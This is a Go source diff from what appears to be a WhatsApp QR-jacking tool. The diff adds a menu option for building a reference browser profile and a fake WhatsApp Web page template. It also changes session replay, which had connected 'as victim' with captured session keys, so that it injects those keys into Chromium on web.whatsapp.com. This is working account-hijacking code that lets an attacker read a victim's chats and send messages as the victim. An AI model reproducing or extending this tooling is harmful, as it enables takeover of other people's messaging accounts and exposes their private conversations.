@@ -93,7 +93,8 @@ func Run() {
 		fmt.Printf("%s[3] - List Sessions%s\n", utils.Green, utils.Reset)
 		fmt.Printf("%s[4] - Replay Session%s\n", utils.Green, utils.Reset)
 		fmt.Printf("%s[5] - Clear Sessions%s\n", utils.Yellow, utils.Reset)
-		utils.PrintReturnOption("6")
+		fmt.Printf("%s[6] - Setup Reference Profile%s\n", utils.Blue, utils.Reset)
+		utils.PrintReturnOption("7")
 
 		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
 		input, _ := reader.ReadString('\n')
@@ -117,6 +118,8 @@ func Run() {
 		case "5":
 			clearSessions(reader)
 		case "6":
+			doSetupReference(reader)
+		case "7":
 			if running {
 				stopServer()
 			}
@@ -157,6 +160,32 @@ func clearSessions(reader *bufio.Reader) {
 	} else {
 		fmt.Printf("%s[-] Cancelled.%s\n", utils.Yellow, utils.Reset)
 	}
+	utils.WaitForEnter(reader)
+}
+
+func doSetupReference(reader *bufio.Reader) {
+	utils.ClearTerminal()
+	fmt.Printf("\n%s============ SETUP REFERENCE PROFILE ============%s\n\n", utils.Blue, utils.Reset)
+	fmt.Println("  This will open Chromium with web.whatsapp.com.")
+	fmt.Println("  You need to scan the QR code with your phone.")
+	fmt.Println("  After pairing, the IndexedDB schema will be saved.")
+	fmt.Println("  This is required ONCE for browser replay to work.")
+	fmt.Printf("\n%sProceed? [y/N]: %s", utils.Green, utils.Reset)
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(strings.ToLower(input))
+	if input != "y" && input != "yes" {
+		fmt.Printf("%s[-] Cancelled.%s\n", utils.Yellow, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
+	}
+
+	refDir := "scripts/qr_jacker/whatsapp/reference"
+	if err := DiscoverReferenceProfile(refDir); err != nil {
+		fmt.Printf("\n%s[!] Error: %v%s\n", utils.Red, err, utils.Reset)
+	} else {
+		fmt.Printf("\n%s[+] Reference profile saved to %s/%s\n", utils.Green, refDir, utils.Reset)
+	}
+
 	utils.WaitForEnter(reader)
 }
 
@@ -515,6 +544,117 @@ pollStatus();
 </script>
 </body></html>`
 
+const replayHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>WhatsApp Web</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;background:#efefef}
+#app{display:flex;width:100%;height:100vh;overflow:hidden}
+.sidebar{width:410px;min-width:340px;background:#fff;border-right:1px solid #e9edef;display:flex;flex-direction:column;flex-shrink:0}
+.main{flex:1;display:flex;flex-direction:column;background:#efeae2;position:relative}
+.main-bg{position:absolute;inset:0;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 288 288"><circle cx="144" cy="144" r="140" fill="none" stroke="%23e0ddd6" stroke-width="2"/><circle cx="80" cy="80" r="4" fill="%23e0ddd6"/><circle cx="208" cy="80" r="4" fill="%23e0ddd6"/><circle cx="144" cy="180" r="40" fill="none" stroke="%23e0ddd6" stroke-width="2"/></svg>');background-size:288px;opacity:0.06;pointer-events:none}
+.header{background:#f0f2f5;padding:10px 16px;display:flex;align-items:center;min-height:59px;border-bottom:1px solid #e9edef;z-index:1}
+.header-avatar{width:40px;height:40px;border-radius:50%;background:#dfe5e7;display:flex;align-items:center;justify-content:center;font-size:18px;color:#54656f;margin-right:15px;flex-shrink:0;overflow:hidden}
+.header-info{flex:1;min-width:0}
+.header-name{font-size:16px;font-weight:500;color:#111b21}
+.header-status{font-size:13px;color:#667781}
+.search-box{padding:8px 12px;background:#f0f2f5;border-bottom:1px solid #e9edef}
+.search-input{width:100%;padding:8px 12px;border:none;border-radius:8px;background:#fff;font-size:14px;outline:none}
+.chat-list{flex:1;overflow-y:auto}
+.chat-item{display:flex;padding:12px 16px;cursor:pointer;border-bottom:1px solid #f0f2f5;transition:background .1s}
+.chat-item:hover,.chat-item.active{background:#f0f2f5}
+.chat-avatar{width:49px;height:49px;border-radius:50%;background:#dfe5e7;display:flex;align-items:center;justify-content:center;font-size:20px;color:#54656f;margin-right:15px;flex-shrink:0;overflow:hidden;font-weight:500}
+.chat-info{flex:1;min-width:0}
+.chat-name{font-size:16px;font-weight:400;color:#111b21;display:flex;align-items:center}
+.chat-name span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.chat-time{font-size:12px;color:#667781;margin-left:6px;white-space:nowrap}
+.chat-preview{font-size:14px;color:#667781;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:2px}
+.chat-unread{background:#25d366;color:#fff;border-radius:16px;padding:0 6px;font-size:11px;min-width:20px;height:20px;display:flex;align-items:center;justify-content:center;margin-left:8px;font-weight:600}
+.messages-area{flex:1;overflow-y:auto;padding:20px 60px;z-index:1}
+.msg-row{display:flex;margin-bottom:2px}
+.msg-row.outgoing{justify-content:flex-end}
+.msg-bubble{max-width:65%;padding:6px 8px 8px 9px;border-radius:8px;font-size:14.2px;line-height:1.4;word-wrap:break-word;position:relative;box-shadow:0 1px 1px rgba(0,0,0,0.06)}
+.msg-row.incoming .msg-bubble{background:#fff;border-top-left-radius:0}
+.msg-row.outgoing .msg-bubble{background:#d9fdd3;border-top-right-radius:0}
+.msg-time{font-size:11px;color:#667781;float:right;margin:4px 0 -4px 8px}
+.msg-bubble em{font-style:normal;color:#667781}
+.empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#8696a0;z-index:1}
+.empty-icon{width:96px;height:96px;border-radius:50%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;font-size:40px;margin-bottom:24px}
+.empty-state h3{font-size:20px;font-weight:300;color:#41525d;margin-bottom:10px}
+.empty-state p{font-size:14px;text-align:center;line-height:1.5;max-width:400px}
+.input-area{padding:8px 16px;background:#f0f2f5;display:flex;align-items:center;gap:8px;z-index:1}
+.input-area input{flex:1;padding:10px 16px;border:none;border-radius:8px;font-size:15px;outline:none;background:#fff}
+.input-area button{width:40px;height:40px;border-radius:50%;border:none;background:transparent;color:#54656f;cursor:pointer;font-size:20px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.input-area button:hover{background:#e9edef}
+.input-area button.send{color:#fff;background:#00a884}
+.input-area button.send:hover{background:#009972}
+.no-chat{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#8696a0;z-index:1}
+.no-chat .lock-icon{width:80px;height:80px;border-radius:50%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;font-size:32px;margin-bottom:20px}
+.no-chat h3{font-size:20px;font-weight:300;color:#41525d;margin-bottom:8px}
+.no-chat p{font-size:14px;max-width:400px;text-align:center;line-height:1.5}
+.back-btn{display:none;background:none;border:none;font-size:24px;cursor:pointer;color:#54656f;margin-right:8px;padding:4px}
+@media(max-width:720px){.sidebar{width:100%}.main{display:none}.main.show{display:flex}.sidebar.hide{display:none}.messages-area{padding:20px 16px}.back-btn{display:block}}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+</style>
+</head>
+<body>
+<div id="app">
+<div class="sidebar" id="sidebar">
+<div class="header">
+<div class="header-avatar" id="selfAvatar">👤</div>
+<div class="header-info">
+<div class="header-name">WhatsApp Web</div>
+<div class="header-status" id="status">Connecting...</div>
+</div>
+</div>
+<div class="search-box"><input class="search-input" placeholder="Search or start new chat" oninput="filterChats()"></div>
+<div class="chat-list" id="chatList"></div>
+</div>
+<div class="main" id="main">
+<div class="main-bg"></div>
+<div class="header" id="chatHeader" style="display:none">
+<button class="back-btn" onclick="showSidebar()">←</button>
+<div class="header-avatar" id="chatAvatar">👤</div>
+<div class="header-info">
+<div class="header-name" id="chatName"></div>
+<div class="header-status" id="chatStatus"></div>
+</div>
+</div>
+<div class="messages-area" id="messagesArea"></div>
+<div class="no-chat" id="noChat">
+<div class="lock-icon">🔒</div>
+<h3>WhatsApp Web</h3>
+<p>Select a chat to start messaging, or wait for new messages to arrive.</p>
+</div>
+<div class="input-area" id="inputArea" style="display:none">
+<input id="msgInput" placeholder="Type a message" onkeydown="if(event.key==='Enter')sendMsg()">
+<button onclick="sendMsg()" class="send">➤</button>
+</div>
+</div>
+</div>
+<script>
+var sel=null,allChats=[],allMsgs={};
+function $(i){return document.getElementById(i)}
+function status(s){$('status').textContent=s}
+function filterChats(){var q=document.querySelector('.search-input').value.toLowerCase();document.querySelectorAll('.chat-item').forEach(function(e){e.style.display=e.dataset.name.toLowerCase().includes(q)?'':'none'})}
+function renderChats(chats){allChats=chats;$('chatList').innerHTML=chats.map(function(c){var a=c.jid===sel?'active':'',u=c.unread>0?'<span class="chat-unread">'+c.unread+'</span>':'',t=c.last_time?new Date(c.last_time*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'';return'<div class="chat-item '+a+'" data-jid="'+c.jid+'" data-name="'+(c.name||c.jid)+'" onclick="selectChat(\''+c.jid+'\')"><div class="chat-avatar">'+(c.name||c.jid)[0].toUpperCase()+'</div><div class="chat-info"><div class="chat-name"><span>'+(c.name||c.jid)+'</span><span class="chat-time">'+t+'</span></div><div class="chat-preview">'+(c.last_message||'')+'</div></div>'+u+'</div>'}).join('')}
+function renderMsgs(jid){var a=$('messagesArea'),msgs=allMsgs[jid]||[];if(!msgs.length){a.innerHTML='<div class="empty-state" style="flex:1"><div class="empty-icon">💬</div><h3>No messages yet</h3><p>Messages will appear here in real-time</p></div>';return}a.innerHTML=msgs.map(function(m){var c=m.from_me?'outgoing':'incoming',t=new Date(m.time*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}),x=m.media_type?'<em>'+m.content+'</em>':m.content;return'<div class="msg-row '+c+'"><div class="msg-bubble">'+x+'<span class="msg-time">'+t+'</span></div></div>'}).join('');a.scrollTop=a.scrollHeight}
+function selectChat(jid){sel=jid;$('noChat').style.display='none';$('chatHeader').style.display='';$('inputArea').style.display='';$('messagesArea').style.display='';var c=allChats.find(function(x){return x.jid===jid});$('chatName').textContent=c?c.name||c.jid:jid;$('chatStatus').textContent=c?'Click here for contact info':'';renderChats(allChats);fetchMsgs(jid);if(window.innerWidth<=720){$('sidebar').classList.add('hide');$('main').classList.add('show')}}
+function showSidebar(){$('sidebar').classList.remove('hide');$('main').classList.remove('show')}
+function sendMsg(){var inp=$('msgInput'),t=inp.value.trim();if(!t||!sel)return;inp.value='';fetch('/api/send?jid='+encodeURIComponent(sel)+'&text='+encodeURIComponent(t),{method:'POST'}).catch(function(){})}
+function fetchChats(){fetch('/api/chats').then(function(r){return r.json()}).then(function(chats){allChats=chats;renderChats(chats);if(sel&&!chats.find(function(c){return c.jid===sel}))sel=null;if(chats.length)status('Online')}).catch(function(){status('Checking...')})}
+function fetchMsgs(jid){fetch('/api/messages?jid='+encodeURIComponent(jid)).then(function(r){return r.json()}).then(function(msgs){allMsgs[jid]=msgs;if(jid===sel)renderMsgs(jid)}).catch(function(){})}
+setInterval(fetchChats,3000);setInterval(function(){if(sel)fetchMsgs(sel)},3000);fetchChats();
+</script>
+</body></html>`
+
 type sessionData struct {
 	Timestamp      string `json:"timestamp"`
 	NoisePub       []byte `json:"noise_pub"`
@@ -710,56 +850,21 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	device := deviceFromSession(sd)
-	cli := whatsmeow.NewClient(device, waLog.Noop)
-	cli.AutoTrustIdentity = true
-
-	rs := newReplayState(cli)
-	cli.AddEventHandler(rs.handleEvent)
-
-	fmt.Printf("\n%s[*] Connecting as victim...%s\n", utils.Yellow, utils.Reset)
-	err = cli.Connect()
-	if err != nil {
-		fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
+	// Check if reference profile exists
+	refDir := "scripts/qr_jacker/whatsapp/reference"
+	postPairingFile := filepath.Join(refDir, "post_pairing.json")
+	if _, err := os.Stat(postPairingFile); os.IsNotExist(err) {
+		fmt.Printf("\n%s[!] Reference profile not found!%s\n", utils.Yellow, utils.Reset)
+		fmt.Println("  Run 'Setup Reference Profile' (option 6) first.")
 		utils.WaitForEnter(reader)
 		return
 	}
 
-	replayPort := pickReplayPort()
-	replayAddr := fmt.Sprintf("127.0.0.1:%d", replayPort)
-	replayURL := fmt.Sprintf("http://%s", replayAddr)
-
-	replayMux := http.NewServeMux()
-	replayMux.HandleFunc("/", rs.handleReplayUI)
-	replayMux.HandleFunc("/api/chats", rs.handleChats)
-	replayMux.HandleFunc("/api/messages", rs.handleMessages)
-	replayMux.HandleFunc("/api/send", rs.handleSend)
-
-	replaySrv := &http.Server{Handler: replayMux}
-	replayLis, err := net.Listen("tcp", replayAddr)
-	if err != nil {
-		replayLis, _ = net.Listen("tcp", "127.0.0.1:0")
-		if replayLis != nil {
-			replayURL = fmt.Sprintf("http://127.0.0.1:%d", replayLis.Addr().(*net.TCPAddr).Port)
-		}
-	}
-	if replayLis != nil {
-		go replaySrv.Serve(replayLis)
-	}
-
-	browser := detectBrowser()
-	if browser != "" {
-		exec.Command(browser, "--new-window", replayURL).Start()
-	}
-
-	fmt.Printf("\n%s[+] Session connected. WhatsApp Web opened at: %s%s\n", utils.Green, replayURL, utils.Reset)
-	fmt.Printf("\n%s[+] Messages will appear in real-time in the browser.%s\n", utils.Yellow, utils.Reset)
-	fmt.Printf("\n%s[+] Press Enter to disconnect and return to menu...%s", utils.Green, utils.Reset)
-	reader.ReadString('\n')
-	cli.Disconnect()
-	if replayLis != nil {
-		replaySrv.Close()
-		replayLis.Close()
+	fmt.Printf("\n%s[*] Injecting session into Chromium with web.whatsapp.com...%s\n", utils.Yellow, utils.Reset)
+	if err := ReplayInBrowser(sd); err != nil {
+		fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
 	}
 }
 
